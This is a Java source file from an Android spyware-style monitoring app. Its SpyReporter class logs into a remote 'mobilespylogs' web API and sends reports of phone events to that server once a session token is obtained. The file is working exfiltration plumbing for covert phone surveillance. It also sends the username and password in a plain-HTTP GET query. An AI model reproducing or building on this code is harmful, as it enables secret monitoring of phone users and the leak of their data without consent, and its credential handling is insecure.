package org.ddth.android.spy.reporter;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.text.DateFormat;
import java.text.SimpleDateFormat;

import org.ddth.http.core.ConnectionEvent;
import org.ddth.http.core.ConnectionListener;
import org.ddth.http.core.Logger;
import org.ddth.http.core.connection.ConnectionModel;
import org.ddth.http.core.connection.Request;
import org.ddth.http.impl.connection.ThreadPoolConnectionModel;
import org.ddth.mobile.monitor.core.Event;
import org.ddth.mobile.monitor.core.Report;
import org.ddth.mobile.monitor.core.Reporter;

/**
 * This implements a generic reporter who takes care the authentication stage.
 * Because all requests usually have to include an authentication token
 * (session id), this implementation makes sure the session is always available
 * beforehand for any requests to use.
 * 
 * @author khoanguyen
 */
public abstract class SpyReporter implements Reporter {
	public static final String WEBAPI_SERVER_ROOT = "http://www.mobilespylogs.com/webapi";

	public static final DateFormat LOG_TIME_FORMAT = new SimpleDateFormat("HH:mm:ss");
	public static final DateFormat LOG_DATE_FORMAT = new SimpleDateFormat("yyyy-MM-dd");

	public static interface ResponseHandler {
		void onResponse(String body) throws IOException;
	}
	
	private static final ResponseHandler DO_NOTHING_RESPONSE_HANDLER = new ResponseHandler() {
		@Override
		public void onResponse(String body) throws IOException {
			Logger.getDefault().debug("Server: " + body);
		}
	};

	/**
	 * A logger that communicate with the server directly via HTTP. Currently,
	 * we have only one communicating direction (from spy to server) and client
	 * must authenticate against server using simple username/password
	 * credentials and get the authentication toke (session) for further
	 * requests.
	 * 
	 * @author khoanguyen
	 */
	public static class SpyLogger {
		String session;
		String username;
		String password;
		ConnectionModel connection = new ThreadPoolConnectionModel();
		
		SpyLogger() {
		}

		public void setAuthCredentials(String username, String password) {
			this.username = username;
			this.password = password;
		}

		/**
		 * Authenticate against the server and save the session if the
		 * authentication is successfully.
		 * 
		 * @param handler
		 */
		public void login(final ResponseHandler handler) {
			Request request = new Request(WEBAPI_SERVER_ROOT + "/login.php?username="
					+ URLEncoder.encode(username) + "&password=" + URLEncoder.encode(password));
			sendRequest(new ResponseHandler() {
				@Override
				public void onResponse(String body) throws IOException {
					handler.onResponse(parseAuthToken(body));
				}
			}, request);
		}

		/**
		 * Parse the body for authentication token (session)
		 * 
		 * @param body
		 * @return null if the authentication is successfully. Otherwise, an error message returned.
		 * @throws IOException
		 */
		private String parseAuthToken(String body) throws IOException {
			String[] tokens = body.split("_");
			String message = null;
			if (tokens.length == 2) {
				if (!"1".equals(tokens[0])) {
					message = tokens[1];
				}
				else {
					session = tokens[1];
				}
			}
			else {
				message = "Authentication failed!";
			}
			return message;
		}

		/**
		 * Send the given request to server asynchronously and send notification
		 * about the connection states to the caller via a specified call back
		 * handler. This uses a thread-pool to handle multiple requests come in
		 * at once and closes the thread-pool as soon as the requests finished.
		 * 
		 * @param handler
		 * @param request
		 */
		public void sendRequest(final ResponseHandler handler, Request request) {
			connection.open();
			connection.sendRequest(new ConnectionListener() {
				@Override
				public void notifyEvent(ConnectionEvent event) {
					switch (event.getEventType()) {

					case ConnectionEvent.REQUEST_INITIATED:
						String requestType = event.getRequest().isPostRequest() ? "POST" : "GET";
						Logger.getDefault().debug(requestType + " " + event.getRequest().getURL());
						break;
						
					case ConnectionEvent.RESPONSE_RECEIVED:
						InputStream inputStream = (InputStream) event.getResponse().getContent().getContent();
						BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
						try {
							handler.onResponse(reader.readLine());
						}
						catch (IOException e) {
							Logger.getDefault().error("Error when processing data", e);
						}
						finally {
							try {
								reader.close();
							}
							catch (IOException e) {
							}
						}
						break;
						
					case ConnectionEvent.REQUEST_FINISHED:
						connection.close();
						break;
					}
				}
			},
			request);
		}
	}
	
	private static SpyLogger logger = new SpyLogger();

	public static SpyLogger getSpyLogger() {
		return logger;
	}

	/**
	 * Subclass overrides this method to construct an HTTP request which will
	 * be sent to the server each time this reporter catches an event & a report
	 * need to be delivered to the server.
	 *  
	 * @param report
	 * @return
	 */
	protected abstract Request createRequest(Report report);
		
	/**
	 * @return The authentication token
	 */
	protected String getSession() {
		return logger.session;
	}
	
	@Override
	public void report(final Event dc, final Report report) {
		// Try to authenticate with username/password credentials if it didn't.
		// This also makes sure the report will be sent only after a successful
		// authentication.
		if (logger.session == null || logger.session.length() == 0) {
			logger.login(new ResponseHandler() {
				@Override
				public void onResponse(String body) throws IOException {
					// No error
					if (body == null) {
						report(dc, report);
					}
				}
			});
		}
		else {
			Request request = createRequest(report);
			logger.sendRequest(DO_NOTHING_RESPONSE_HANDLER, request);
		}
	}
}
